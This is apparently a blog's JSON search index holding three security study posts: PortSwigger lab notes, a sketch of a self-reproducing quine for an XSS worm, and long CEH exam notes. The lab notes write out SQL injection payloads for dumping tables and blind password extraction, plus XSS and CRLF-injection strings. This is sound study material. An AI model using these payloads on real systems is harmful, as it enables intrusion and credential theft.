[
  
  {
    "title": "BurpSuite Lab",
    "url": "/posts/BurpSuite-Lab/",
    "categories": "sec",
    "tags": "burpsuite",
    "date": "2022-05-10 11:33:00 +0800",
    





    "snippet": "sql injectioncheetsheethttps://portswigger.net/web-security/sql-injection/cheat-sheet'+OR+1=1--'+UNION+SELECT+NULL,NULL---- find columns are compatible with string data'+UNION+SELECT+'abcdef',NULL,NULL---- oracle, find database type and version'+UNION+SELECT+'abc','def'+FROM+dual--'+UNION+SELECT+BANNER,+NULL+FROM+v$version---- mysql, find database type and verion'+UNION+SELECT+'abc','def'#'+UNION+SELECT+@@version,+NULL#-- list database contents, not oracle'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'---- list database contents, oracle'+UNION+SELECT+table_name,NULL+FROM+all_tables--'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'---- blind, conditional responses-- \"Welcome back\" message disappears if errorTrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='aTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='aTrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='aCross-site scriptingReflected XSS  url web-security-academy.net/?search=&lt;script&gt;alert%281%29&lt;%2Fscript&gt;  &lt;script&gt; alert(1) &lt;/script&gt;DOM XSS  “View source” option won’t work for DOM XSS testingdocument.writefunction trackSearch(query) {\tdocument.write('&lt;img src=\"/resources/images/tracker.gif?searchTerms='+query+'\"&gt;');}var query = (new URLSearchParams(window.location.search)).get('search');if(query) {\ttrackSearch(query);}  \"&gt;&lt;svg onload=alert(1)&gt;innerHTMLfunction doSearchQuery(query) {    document.getElementById('searchMessage').innerHTML = query;}var query = (new URLSearchParams(window.location.search)).get('search');if(query) {    doSearchQuery(query);}  &lt;img src=1 onerror=alert(1)&gt;href attribute  "
  },
  
  {
    "title": "self reproducing code",
    "url": "/posts/self-reproducing-code/",
    "categories": "sec",
    "tags": "c",
    "date": "2022-04-29 11:33:00 +0800",
    





    "snippet": "How to write a quineself-reproducing codeA quine is a program, takes no input and produces a copy of its own source code as its only output.original code is:Head is: malicious code + data of line numbers for tailBody is:  `Head in string` + `Tail in string`Tail   is:  reproducing codeTail code = print(Body.head) + print(Body) + print(Body.tail)after execution:  execute malicious code  print the code it selfusage: XXS worm"
  },
  
  {
    "title": "CEH small points",
    "url": "/posts/CEH-SMALL-POINTS/",
    "categories": "sec",
    "tags": "ceh",
    "date": "2022-04-18 11:33:00 +0800",
    





    "snippet": "Insertion attack  TTL field, some packets will end in IDS  like tcp 3 packets [maliciou][xxx][s], IDS see maliciouxxxs, backend see malicious.  PHF attack, “phf” in GET request.Unicode invasion, aka Obfuscating  bypass IDS, IDS cannot recognize, but web server can decode  \\u017F can be used as SRogue router: thentication to prevent.Regulation:  HIPAA:  Health Insurance Portability and Accountability Act. modernize the flow of healthcare information.  FISMA: The Federal Information Security Management Act of 2002. requires each federal agency  ISO/IEC 27002  COBIT: Control Objectives for Information and Related Technologies.  NIST-800-53: defines security and privacy controls for all U.S. federal information systems except those related to national security  PCI-DSS: Payment Card Industry Data Security Standard, handle branded credit cards from the major card schemes.  EU Safe Harbor: prevent private organizations store customer data from accidentally disclosing or losing personal information.  SOX: Public Company Accounting Reform and Investor Protection Act. aka Sarbanes–Oxley Act  DMCA: Digital Millennium Copyright Act  PII: personally identifiable informationNIST Cybersecurity Framework`s functions: Identify, Protect, Detect, Respond, RecoverPCI Data Security Standards:  Build and Maintain a Secure Network  Protect Cardholder Data  Maintain a Vulnerability Management Program  Implement Strong Access Control Measures  Regularly Monitor and Test Networks  Maintain an Information Security PolicyMAC address: 6-byte/ 12-hex/ 48-bit.MAC filteringCRLF attack: Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, )  attackers can set fake cookies, steal CSRF tokens, disclose user information by injecting a script (XSS)    GET /%0d%0aSet-Cookie:CRLFInjection=PreritPathak HTTP/1.1      Rootkit:  was a collection of tools that enabled administrative access to a computer or network  now provides root-level, privileged access while hiding  Sensitive data stolen, Malware infection, File removal, Eavesdropping, Remote controltype of rootkit:  User-mode or application rootkit.    easy to detect  Kernel-mode Rootkit.     difficult to detect,  change the code of the core components of the operating system  Bootkits.       infecting its master boot record (MBR)  Firmware rootkits.       routers, network cards, hard drives or system BIOS  hypervisor Rootkit.    installed between the hardware and the kernel, intercept hardware calls made by the original operating system.Hosts:  /etc/hosts OR c:\\Windows\\System32\\Drivers\\etc\\hosts:  Block a website: in host file to 0.0.0.0 (better) or 127.0.0.1 (waste tiny resources)  Test, Shortcuts, Improve speed (than DNS query)…c:/boot.ini:  NT-based operating system prior to Windows Vistaetc/networks:  like hosts, but for network.Non-repudiation: cannot deny the validity of something.Man-in-the-Middle AttackReplay attackTraffic analysis attack: passive &amp; activePayment Card Industry Data Security Standard  Perform external penetration testing at least annually  and after any significant infrastructure or application upgrade or modification (operating system upgrade, a sub-network added, a web server added)Kon-Boot:  allows users to bypass Microsoft Windows and Apple macOS passwords.Cain &amp; Abel:  password recovery tool for Microsoft Windows.  forge certificates for authentication.  create certificates that are not officially signed by a CA  password cracking, ARP spoofing, and conducting man-in-the-middle attacks.PAP: Password Authentication Protocol.  a weak authentication protocol. not encrypt any data.Markov Chains attack: assemble a certain password databaseToggle-Case:  creates every possible case combinationPKI protect email at Presentaion layer.Quantum cryptography:  encrypted by a sequence of photons that have a spinning trait.QKD: quantum key distributionQuantum coin flippingEinstein-Podolsky-Rosen (EPR) paradoxFirewall:  Application firewall: Internet Relay Chat (IRC) is an application layer protocol. Find SQLi, XXS. layer 7  Network-based application firewalls:  can understand FTP, DNS, HTTP. check for malware.  Host-based application firewalls:  monitors application system calls or other general system communication.  multi-homed firewall: a node with multiple NICs that connects to two or more networks.  statefull firewall: layer 4  Access control list: layer 3 or 4.testing:  Fuzzing testing: Black Box  Concolic testing:  treats program variables as symbolic  Monkey testing: fuzz to crash  Security testing:  intended to reveal flaws in the security mechanisms of an information system that protect data and maintain functionality as intended.Nmap:  -F (Fast (limited port) scan)                              -T paranoid          sneaky          polite          normal          aggressive          insane (0          1          2          3          4          5), -T5 very fast.                      -sA ACK scan. map out firewall rulesets. For unfiltered systems, open and closed ports will both return a RST packet.  -sS scan by stealth/Syn  -sU scan for UDP. DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68), open or filtered no response or UDP response(rare); closed ICMP with port unreachable.  -sT scan with TCP connect.  -sP scan by PING.  -O OS scan need root privileges.  use enip-info script. nmap --script enip-info -sU -p 44818 &lt;host&gt;find Device Type, Vendor ID, Product name, Serial Number, Product code, Revision Number, status, state, as well as the Device IP.  http-methods script. detect HTTP methods.  http-enum script. Enumerates directories used by popular web applications and servers.  HTTP ETag. aka entity tag, allows a client to make conditional requests  -sY: SCTP INIT scan. SCTP is a relatively new alternative to the TCP and UDP protocols  -R: reverse DNS resolution on the target IP addresses  -r: randomizes the port scan order  -D decoy, hide your IP in decoy IPs.  -S IP_Address (Spoof source address).  -PU UDP ping  -PP ICMP timestamp ping  -PY SCTP init ping  -Pn dont ping. treat the target host(s) as being alive, bypass ICMP block.  -sn disable the port scan  -f fragment packets, split up the TCP header over several packets, bypass IDSscript help: nmap --script-help &lt;script-name&gt;ICMP type code:  0 echo reply (response)  3 Destination unreachable  4 Source quench (deprecated)  5 Redirect  8 echo (request)Nikto: scanner for web servers for dangerous files/CGIs, outdated server software.netsparker: security scannerLayer 4 vs layer 5:  Transport layer: establishes a connection between two machines, transmitting segments. TCP.  Session layer: create, maintain, terminate connections between two processes. PPTP. RPC. Password Authentication.  An application can run many processes simultaneously to accomplish the work of the application.port: 16-bit, 4-hex, 2-byteIPv6: 128 bits. 32-hex, 16-byte. (4-times of v4). No broadcast, instead of multicastIPv4: 32 bits. 8-hex, 4-byte.SQL injection:  Compromised data integrity.  Unauthorized access to an application.  Information disclosure.  Loss of data availability.ACK scanning:  whether the port is filtered or unfiltered.  if firewall stateful(no response or  ICMP destination unreachable)  if stateless(RST, no matter open or closed).TCP Connect/Full Open Scan:  full 3-way hand shake.  most reliableInverse TCP flag scanning:  include: FIN, XMAS, NULL, URG, PSH  open: no response. close: RST and ACK bits set.                              identify: open          filtered, closed, or filtered                      why use: Firewall EvasionXmas Scan:  sX  PSH, URG, FIN.  Each operating system or network device responds different  to Xmas packets  revealing local information such as OS (Operating System), port state and more.  open: no response. close: RST.Null Scan:  sN  no flag.-sn: not to scan any ports. (diff to -sN)FIN scan (-sF): if open, no response(no previous connection).The Maimon scan:  sM, FIN/ACK  open: no response. close: RST.Half-open scan: aka  SYN scan. it’s a fast and sneaky. if closed, RST is back. if open, SYN/ACK is back.  concern: a lot of half open connections.Scan:  Banner Grabbing: protocol HTTP, FTP, SMTP; tools Telnet, nmap, Netcat. See response banner information about service.  IPID scan: aka IDLESSDP Scanning scan.  SSDP Scanning: Simple Service Discovery Protocol, text-based protocol based on HTTPUXSS, aka HTML InjectionXSS Reflection: XSS in URL.Vulnerability scanning 3 steps:            Locating nodes.                  Service and OS discovery on them.                  Testing services and OS vulnerabilities.      Wrapping attacks:  A Simple Object Access Protocol (SOAP) message is encoded as an XML document.  valid signature ONLY covers the unmodified element while the faked one is processed.SOAP:  extensibility  neutrality. (over HTTP, SMTP, TCP, UDP)  independence (any programming model)WS-Address spoofing:  provides additional routing information in the SOAP header  allowing asynchronous communication  a subtype:  BPEL Rollback. requires the existence of BPEL engineWS-Security: an extension to SOAP to apply security to Web services.WS-Policy: allows web services to use XML to advertise their policies.WSDL: Web Services Description LanguageSOAPAction spoofing:  an additional HTTP header element called SOAPAction  the operation to be executed solely on the information contained in the SOAPAction attributeXML Flooding: send a large number of legitimate SOAP MessagesSoap Array Attack:  cause a denial of service attack to limit the web service availability.  lead to memory exhaustion. declares an array with 1,000,000,000 String elements.SQLi:  DMS-specific SQLi / out-of-band OOB SQLi.  DNS or HTTP query to the SQL server with SQL statement. create DNS or HTTP requests to transfer data to an attacker  Classic SQLi. Error based, or UNION based.  Compound SQLi. SQLi with XSS, DoS, DNS hijacking.  Blind SQLi. based on True/False questions.  Union-based SQLiCSRF:  aka. one-click attack, or session riding  Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user’s browser.Manipulating Hidden Fields:  the server’s trust of client-side processing by modifying data on the client-side.Protocol\t\tPublished\t\tStatus  SSL 1.0\t\tUnpublished\tUnpublished  SSL 2.0\t\t1995\t\t\t\tDeprecated in 2011 (RFC 6176)  SSL 3.0\t\t1996\t\t\t\tDeprecated in 2015 (RFC 7568)  TLS 1.0\t\t1999\t\t\t\tDeprecated in 2020 (RFC 8996)[8][9][10]  TLS 1.1\t\t2006\t\t\t\tDeprecated in 2020 (RFC 8996)[8][9][10]  TLS 1.2\t\t2008  TLS 1.3\t\t2018TLS uses RSA for the handshake and key negotiation.Heartbleed:  a security bug in the OpenSSL cryptography library.  classified as a buffer over-read, transmit server`s memory(RAM) to attacker.  lack of bounds checking  CVE-2014-0160SSL/TLS Renegotiation Vulnerability:  DoS, or MITM into HTTPS sessions.POODLE attack:  “Padding Oracle On Downgraded Legacy Encryption”, fallback to SSL 3.0.Snort: Sniffer Mode / Packet Logger Mode / Network Intrusion Detection System Modetcpdump: Wireshark for CLItcpslice: a tool for extracting portions of packet trace files generated using tcpdump’s -w flag.  -w: Write the raw packets to file rather than parsing and printing them out.tcptrace:  TCP connection analysis tool, through dump filesprotocol analyzer: a tool used to monitor data traffic and analyze captured signals.arp cache poisoning: aka arp apoofing. MitM, attacker must access the network.  check two different IP addresses that share the same MAC address.ARP on network layer.BetterCap: tool for MitM.ARP cache: a table of IP to MAC.Dynamic ARP inspection (DAI):  check if ARP packet match a valid entry in the DHCP snooping database, if not, drop the packet.Port security: lock port(s) to certain MAC addresses.  Dynamic locking / Static lockingDHCP relay:  DHCP option 82, also known as the DHCP relay agent information option, to help protect supported Juniper devices against spoofing (forging) of IP addresses and MAC addresses, and DHCP IP address starvation.Spanning tree:  prevent bridge loops.  layer 2DHCP Starvation attack:  ton of bogus DISCOVER packets. Typically next, bring attacker`s rogue DHCP server.  Static application security testing (SAST) white-box  dynamic application security testing (DAST) black-box  Mobile Application Security Testing (MAST)  Interactive Application Security Testing (IAST)Metasploit module  Auxiliary module: scanners, fuzzier, and SQL injection tools  Exploit Module: code within the database runs on a victim computer.  Payload Module: payload is generally attached to the exploit before its execution.  NOPS Module:  x86 chips as 0x90.  getsystem:  Metasploit post-exploitation module to escalate privileges.Metasploit scan for SNMP configuration: auxiliary/scanner/snmpmsfvenom should be used in place of msfpayload+msfencode: msfencode bypass antivirusIDS/IPS:  WIPS: Wireless Intrusion Prevention System  HIDS: host-based intrusion detection system. one of the last layers of defense and reside on computer endpoints. signature-baseddetection method  NIDS: Network-based intrusion detection system.  at the physical and network layers after it has passed through a firewall. Only packet level analysis, can be bypass by encryption.  AIDS: Anomaly-based intrusion detection system. often with artificial intelligence type techniques.  a high false-positive rate. Baseline must be set Prior to deploying.  SIDS: signature-based IDSSnort rule:  ``` alert tcp any 21 -&gt; 10.199.12.8 any (msg:”FTP Packet “; sid:1000010)  Rule Header, Rule Option  action protocol LIP LPort direction RIP RPort, Rule OptionIntranet machine to visit Internet:  Mediation servers like IRC, Usenet, SMTP and Proxy server  Network address translation (NAT)  Tunneling protocolProxy server: sit in middle between an external network and the private network.  Routers and switches don’t sit in the middle, merely passing traffic along based on source and destination addresses.router: seperate Broadcast domainsSybil attack: creating a large number of pseudonymous identities. attack distributed hash table (DHT) system.Exploit Kits: simply a collection of exploits.Cloudborne attack: infrastructure-as-a-service (IaaS) attack.  implant backdoor in the firmwareSaaS, PaaS, IaaSStaas - Storage as a Servicecloud carrier/ auditor/ broker/ consumerCloud deployment models:  Public cloud.            on a subscription basis  Private cloud.          used by a single organization  Hybrid cloud.           private and public  Community cloud     restricted to the members of the communityVirus  multipartite virus: attack both the boot sector and executable files.  stealth virus: change the read system call, when the user asks to read a code modified by a virus, the original form of code is shown rather than infected code. types:  boot virus,  file virus, Macroviruses. ex:  Virus.DOS.Stealth.551, Exploit.Macro.Stealth, Exploit.MSWord.Stealth, Brain, Fish.  tunneling virus: bypass scanner. installing itself in the interrupt handler chain. or in device drivers  A polymorphic virus: generates numerous mutated versions of itself.  Macro virus: documents, spreadsheets, and other data files  Cavity virus: aka Spacefiller, overwriting unused areas of executable files.  Encryption virus, aka RansomwareGoogle search:  [site:] [inurl:] [link:] [cache:]  [related:] Lists web pages that are similar to a specified web page.  Put minus (-) in front of any term (including operators) to exclude that term from the resultsSocial engineering:  quid pro quo attack. (aka “something for something” attack)  Reverse Social Engineering. (victim find the attacker)  Tailgating. aka piggybacking.  follows an authorized individual into a secured premise.  Elicitation. the subtle extraction of information during an apparently normal and innocent conversation.  Pretexting. use fake identities to manipulate the receipt of information.  Honey trap. pretends to be an attractive person and fakes an online relationship  Diversion theft.  persuading victims to send it to the wrong recipient  Baiting.  offer playing on fear, greed, and temptation  impersonation attack.  Session Donation.Boot Sector Virus:  Move the MBR(Master Boot Record) to another location on hard disk.  copy it self to the original location of the MBR.Low-bandwidth attacks: nmap`s slow scan.Session Splicing:  split the attack traffic into many packets such that no single packet triggers the IDS.  tools: Nessus,  ‘Nikto’, ‘whisker’ and ‘Sandcat’Desynchronization Attack: RFID(Radio-frequency identification ) related threat.  Metasploit: important sub-projects include the Opcode Database, shellcode archive and related research.  Analyst’s Notebook:  software product from IBM for data analysis and investigation.  Palantir: Palantir Technologies is a public American software company that specializes in big data analytics.802.1x protocol:  defines an access control and authentication protocol  IEEE standard for port-based authentication  client authentication in wireless networks, security accessDragonblood: WPA3 vulnerabilities.Key reinstallation attack: KRACK, a severe replay attack on WPA2.KRACK attack: Key Reinstallation Attack, a replay attack.WEP: Wired Equivalent Privacy,  mimic the privacy characteristics of a wired LAN,  insecure RC4 cipher  Initialization Vector (IV) is Too SmallRC4: symmetric stream cipher.RC5, RC6: symmetric-key block cipher.RADIUS:  Remote Authentication Dial-In User Service,  a networking protocol that  provides centralized authentication, authorization, and accounting (AAA) management for usersdigital signature: unforgeable, authenticmulti-factor authentication scheme:  Something you have  Something you know  Something you are  Somewhere you arecounter-based authentication: both the token and the authenticating server maintain a counter, whose value besides a shared secret key is used to generate the one-time password.Footprinting: passive collection of information without touching the target system/network/computer.Scanning: active collection of information.Enumeration: active, gather more information.DOS:  Slowloris: tries to keep many connections to the target web server open and hold them open as long as possible. most likely successful  HTTP GET/POST (HTTP Flood):  Spoofed Session Flood.  contains multiple SYN and multiple ACK packets along with one or more RST or FIN  IP fragmentation scan/attack. Fragmentation is associated with IP; whereas Segmentation is associated with TCP.  Phlashing. exploits a vulnerability in network-based firmware updates, permanent.  Teardrop attack.  attempts to make a computer resource unavailable by flooding a network or server with requests and data  APDoS. advanced persistent DoS.  persist for weeks  Smurf. distributed denial-of-service. ICMP.  Fraggle attack. distributed denial-of-service. UDP.  bonk attack: sends fragmented UDP packets to a Windows system, may cause the system to crash, DoS  Yo-yo. aimed at cloud-hosted. attack until a cloud-hosted service scales outwards. when scales back down, the attack resumes,  XOIC. a ddos tool.  LOIC: Low Orbit Ion Cannon, do DDoS.SQLi Tautology: OR ‘1’ = ‘1’; –Bluedriving: wardriving utility. check same devices on map.Bluetooth attack:  Bluejacking:  transmits data to the target device. without pairing.  Bluesmacking: specially crafted packet can make a device unusable(DoS).  Bluesnarfing:  theft of information from the target device.  Bluebugging: Similar to bluesnarfing, 10–15 meters.Jailbreaking exploits:            Userland Exploit: It allows user-level access but does not allow iboot-level access.                  iBoot Exploit: An iBoot jailbreak allows user-level and iboot-level access.                  Bootrom Exploit: It allows user-level access and iboot-level access.      Jailbreaking types: Tethered, Semi-Tethered and Untethered.  Untethered Jailbreak: patches the kernel during the device boot to keep jailbroken after each reboot  Semi-untethered Jailbreak: like semi-tethered, but without using a computer.  Tethered Jailbreak:  computer running the jailbreaking software, or the iOS device will not be able to boot at all.  Semi-tethered Jailbreak: can reboot, but will have an unpatched kernel.patch management: Making determinations about patch disposition for business systems.aLTEr attack: a fake eNodeB (the 4G cell tower), Man-in-The-Middle (MiTM)  https://alter-attack.net/media/breaking_lte_on_layer_two.pdfEttercap: a comprehensive suite for man in the middle attacks.Jamming signal attack.Attack model:  Ciphertext-only attack (COA): access only to a set of ciphertexts, can guess standard protocol data.  Known-plaintext attack:  access to at least a limited number of pairs of plaintext and the corresponding enciphered text.  Chosen-plaintext attack: able to choose a number of plaintexts to be enciphered and have access to the resulting ciphertext.          Adaptive chosen-plaintext attack:  choose step by step        Chosen-ciphertext attack (CCA): can choose arbitrary ciphertext and have access to plaintext decrypted from it.  Open key model attacks:  some knowledge about the key for the cipher being attacked.Rubber-hose attack: the cryptanalyst uses blackmail, threats, torture, extortion, bribery, etc.File system permissions vulnerability:  Processes may automatically execute specific binaries as part of their functionality or to perform other actions.Firewalking: utilizes traceroute techniques and TTL values to analyze IP packet responses in order to determine gateway ACL (Access Control List) filters and map networks.Windows system tools:  gpedit.msc  Group Policy Editor  ncpa.cpl. ncpa  Network Control Panel Applet, cpl = Control Panel  services.msc Opens Windows Services Manager.  compmgmt.msc Computer Management ConsoleHoney pot types:  Pure honeypots.  full-fledged production systems.  Low-interaction Honeypots.  will not be able to interact with your decoy system in any depth.  High interaction honeypots.  emulates certain protocols or services.  Research honeypots. gather information about the black hat community. not to a specific organization.fingerprinting: Matching OS characteristics from a scan to a database in Nmap.find honey pots:  Honeyd Honeypot: perform time-based TCP fingerprinting methods  User-Mode Linux (UML) Honeypot: analyze /proc/mounts, /proc/interrupts, and /proc/cmdline, which contain UML-specific information.  Sebek-based Honeypots: analyzing the congestion in the network layer  Snort_inline Honeypot: analyzing the outgoing packetsWebsite defacement vulnerability: commonly carried out by hacktivists.Risk Mitigation:  accept. Risk Acceptance  avoid. Risk Avoidance. most expensive of all risk mitigation options  reduce. Risk Limitation. most common  transfer. Risk TransferenceRisk = Threat Probability * Vulnerability ImpactFull disk encryption:  BitLocker Drive Encryption leaves an unencrypted volume to boot from, while the volume containing the operating system is fully encrypted.recovery:  AV (Asset value)  SLE (Single Loss Expectancy)  ARO (Annual rate of occurrence)  ALE (Annual Loss Expectancy)IPSec:  IPSec: Key exchange, Packet headers and trailers, Authentication, Encryption, Transmission, Decryption. On layer 3 (Network).  IPsec driver.  performs protocol-level functions required to encrypt and decrypt packets  IKE: Internet Key Exchange, used to set up a security association (SA), exchange secret keys  AH (Authentication Header) protocol. integrity / ESP (Encapsulating Security Payload) protocol. integrity AND confidentiality  tunnel mode (gateway-to-gateway) / transport mode (host to host)  AH tunnel/ AH trasport/ ESP tunnel/ ESP transportRemote access policy:  using of a VPN  for gaining access to an internal corporate networkIPsec suite protocols:  Authentication Header (AH),  Encapsulating Security Protocol (ESP),  Security Association (SA), one of the most common is Internet Key Exchange (IKE)some attacks:  Clickjacking: invisible page or HTML element.  Session Fixation: attacker can send a link containing a fixed session-id. Unlike.  Session Hijacking: rely on stealing the Session ID. (cookie hijacking)  HTML Injection:  sends HTML code through any vulnerable field.  quite similar to the XSS attack  HTTP Parameter Pollution: passing of multiple parameters having the same name, application may interpret values in unanticipated ways.Network or TCP Session Hijacking: TCP communication with incrementing sequence number.  create a state where the client and server are unable to exchange data; enabling him/her to forge acceptable packets for both ends, which mimic the real packets. Thus, the attacker is able to gain control of the session. below some types:  IP Spoofing  Man in the middle Attack (TCP Hijacking). Initial sequence numbers (ISN)  Blind Hijacking. (source routing is disabled)  UDP session Hijacking  https://www.greycampus.com/opencampus/ethical-hacking/network-or-tcp-session-hijacking?sscid=c1k4_w62kpRegistration hijacking:  attacker replaces the legitimate registration with a false one.DMZ Network: extra layer of securityExtranet: part of a DMZ but bridges access from organization to organizationon application layer protocol:  SFTP: FTP over SSH (Secure Shell),  port 22,  FTPS: FTP-SSL. (adds support for the Transport Layer Security (TLS), SSL is now prohibited)  SSL:  Secure Sockets Layeraccess-list example:  FTP uses port 21 for control, 20 for data transfer.  TCP traffic destined to port 21 and port 20 is denied and everything else is explicitly permitted.    access-list 102 deny tcp any any eq ftpaccess-list 102 deny tcp any any eq ftp-dataaccess-list 102 permit ip any any      FTP vs HTTP: FTP file transfer, HTTP website access. Both on application layer.protocol:  PPP: Point-to-Point Protocol, layer-2, between two routers directly without any host  PEM: Privacy-Enhanced Mail,  SET: Secure Electronic Transaction, security protocols and formats that enabled users to employ the existing credit card payment infrastructure.Fileless malware: operates in memory,  low-observable characteristics (LOC), Adware: aka advertisement-supported software,Malware detection:  Cloud-based detection: providing data to the cloud engine for processing.  Behavioral-based detection:  observes how the program executes  Heuristics-based detection: might look for rare instructions or junk code; without an exact signature match.  Real-time protectionHit-list scanning: a list of vulnerable hosts can be composed in advance and sent along with the wormworm: does not need a host or human interaction to disrupt and corrupt dataIDOR: (Insecure direct object references )  https://insecure-website.com/customer_account?customer_number=132355LoT layers:  Sensor-connected LOT  LOT gateway. connected to the internet  Cloud.  IOT Analytics. raw data is converted into actionable business insightsFCC ID search: gather information about LoT devices.LoTSeeker: scan the target network for IoT devices and detect default, factory-set credentials.Censys: automated monitoring LoT.Shodan: world’s first search engine for Internet-connected devices.Bullguard IoT: find if your device is on Shodan.Power/Clock/Reset Glitching: one type of fault injection attack to IoT deviceachieve chip-level security of an IoT device: encypting the JTAG interface.Prevent sniff attacks: use encryption protocols (“best option”)Sniffing:  active. Sniffing the switch.  bogus MAC address. layer 2  passive.  sniffing the hub. layer 1Unspecified Proxy Activities: configured multiple domains pointing to the same host to switch quickly between the domains and avoid detectionCAM table:  aka content-addressable memory table  contains a list of MAC addresses that are associated with a port on a layer 2 switching deviceCAM Overflow: context-addressable memory (CAM) table. no more new MAC addresses can be learned. turn switch into a hub.VLAN hopping attack: 2 methods  switch spoofing and double taggingemail:  spoofing.  fabrication of an email header, make the recipient think the email originated from someone else.  harvesting. (or scraping ). obtaining lists of email addresses using various methods. open-source tool: theHarvester.  masquerading.  broader concept than spoofing, more than just header.  phishing.  malicious link to many people. spear phishing to specific people.Evilginx:  phishing tool.  a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service.whaling: phishing, masquerade as a senior one, CEO fraudSmishing: mobile phones phishing. aka SIM swap scam, SIM splitting, simjacking, SIM swappingVishing: voice phishingClone phishing: create an almost identical or cloned email, only attachment changed.Infoga: a tool gathering email accounts information (IP, hostname, country,…) from a different public sourcedocker:  platform as a service (PaaS) productsdocker config network  docker macvlan network:          assign a MAC address to each container’s virtual network interface      appear to be a physical network interface directly connected to the physical network      NIC need “promiscuous mode”        docker Bridge networking          containers on same bridge network to communicate, on different can not.        docker Host networking          container’s network stack is not isolated from the Docker host      container bind to host`s port      use when handle a large range of ports, as it does not require network address translation (NAT)        docker Overlay networking          creates a distributed network among multiple Docker daemon hosts        monitor mode: sniff layer 2. like wireless traffic.  promiscuous mode: sniff layer 3. can not capture wireless.Residual risk = (Inherent risk) – (impact of risk controls)  the amount of risk left over after natural or inherent risks have been reduced by risk controls.WHOIS:  protocol that used for querying databases that store the registered users or assignees of an Internet resourceInternet Assigned Numbers Authority:  a standards organization, oversee global IP allocation /autonomous system /DNS…CAPTCHA:  “Completely Automated Public Turing test to tell Computers and Humans Apart”Internet Engineering Task Force: IETF,  standards that comprise the Internet protocol suite (TCP/IP)Wireless networks two types:  ad hoc.  peer to peer. (mesh topology)  infrastructure.  an access point that all devices connect to (star topology)Wireless Network:  The SSID (service set identifier): make your network visible and easily accessible.  Invisible wifi: disable SSID, connect by configure their settings manually by including the network name, security mode, and other relevant info.      NetStumbler or Kismet can easily locate hidden networks.    802.11a: 5 GHz bands, 54 Mbit/s  802.11n: 2.4 GHz / 5 GHz bands, 54 Mbit/s to 600 Mbit/s,  802.11g: 2.4 GHz band, 54 Mbit/s,  802.11i:  specifies security mechanisms for wireless networks  802.16: 1-6 miles.On a wireless network, proper credentials: SSID and password  SSID    Name of a Network  BSSID  basic service set identifier  ESSID  Extended Service Set IdentificationWPA: Wi-Fi Protected AccessWPA2:  use 4 way handshake to protect against replay attacks.  use CCMP as authentication protocolWPA3-Enterprise: 192-bit cryptographic strength, cryptographic tools to protect sensitive data.  Aircrack-ng: detector, packet sniffer, WEP and WPA/WPA2-PSK cracker and analysis tool for 802.11 wireless LANsZig-Bee: short-range wireless.wifi:  Kismet: network detector, packet sniffer, and intrusion detection system for 802.11 wireless LANs.  Wireshark with Airpcap: analyzing packets on your wireless network  Wi-Fi Pineapple:  a wireless auditing platformWardriving:  physically searching for wireless networkspacket sniffers:  tshark (can specify the individual fields you want printed in the output)  tcpdump (can not specity individual fields)  Snoop (can not specity individual fields)some ports:  FTP: tcp/21(command), tcp/20(data).  SSH: tcp/22  Telnet: tcp/23  SMTP: tcp/25.  DNS: udp/port 53.  POP3: tcp/110.  NTP: udp/port 123 (Network Time Protocol)  CHARGEN: udp,tcp/19 (Character Generator Protocol)  XDMCP: udp,tcp/177 (X Display Manager Control Protocol )  SNMP: udp,tcp/161 (Simple Network Management Protocol) (version3 has encryption)  Server Message Block (SMB): tcp/139 (on NetBIOS) or tcp/445(after windows 2000)  LDAP : tcp/389. (Lightweight Directory Access Protocol)  LDAPS: tcp/636.  kiwi syslog:  tcp/514.  printer: tcp/515.  BGP: tcp/179 (Border Gateway Protocol)  IMAP: tcp/143, Internet Message Access Protocol  Service Location Protocol (SLP)SNMP:  application layer, use UDP protocol  protocol data units (PDUs)  TRAP. An asynchronous alert sent by the agent to the SNMP manager  Community strings: is used for authentication, like password. SNMPv3 encrypts it.NetBIOS:  Network Basic Input Output System  Enumeration: list computers, shared resources  nbtstat: gather NetBIOS configurations information on WindowsJXplorers: query remote LDAP servers, to gather informationLDAP:  implementation of X.500. X.509LDAP Enumeration Countermeasures:  use SSL or STARTTLS  enable account lockout  Restrict access to Active Directory by using software such as Citrix.  Use NTLM.  Windows New Technology LAN Manager.  security protocols by Microsoft to authenticate users’ identityX.509:  standard describes what and how certificates are created.  public key cryptography.  is the specification for a certificate  organizational unit(OU) is a field in a certificate specified in X.509AOL Search https://search.aol.com/: same as google, baidu, duckduckgo.zabasearch: Find people, addresses &amp; phone numbers.ike-scan: Discover and fingerprint IKE hosts (IPsec VPN Servers)Cloud Hopper: APT10Cloud Hopper attacker:  used MSP’s as intermediaries to acquire assetsAn advanced persistent threat (APT)APT lifecycle: ( requires more resources than a standard web application attack)            Define target                  Find and organize accomplices                  Build or acquire tools                  Research target                  Test for detection                  Deployment                  Initial intrusion                  Outbound connection initiated                  Expand access and obtain credentials                  Strengthen foothold                  Exfiltrate data                  Cover tracks and remain undetected      Cyber Kill Chain 7 steps:  Reconnaissance  Weaponization  Delivery  Exploitation  Installation (installs an access point)  Command and Control  Actions on Objective ( ransom, data exfiltration, data destruction)robots.txt:  a text file webmasters create to instruct web robots (typically search engine robots) how to crawl pages on their website  sitemap.xml, for large websites.DNS spoofing:            send DNS queries to the DNS resolver                  overloads the DNS with poisoned responses                  wait legitimate user to query DNS      DNS cache snooping:  if the DNS server has a specific DNS record cached  deduce if the DNS server’s user have recently visited a specific site.vulnerability assessment solutions:  Product-based solutions. in internal network, drawback is no outside view.  Service-based solutions. mimics the perspective of a hackervulnerability assessment tools employ:  Tree-based assessment.  Inference-based assessment.  begin with scan all machines and ports.risk assessment`s four components:            Technical Safeguards.               vulnerability scan                  Organizational safeguards         “minimum necessity rule.”                  Physical safeguards                  physical protection of information                  Administrative safeguards         information from a legal perspective      risk assessment methods:  Business impact analysis (BIA)  study how various types of negative events (violations, failures or destructions) can affectSMTP commands:  VRFY. verify a user ID  HELO – The client “signs on” to the server using the HELO 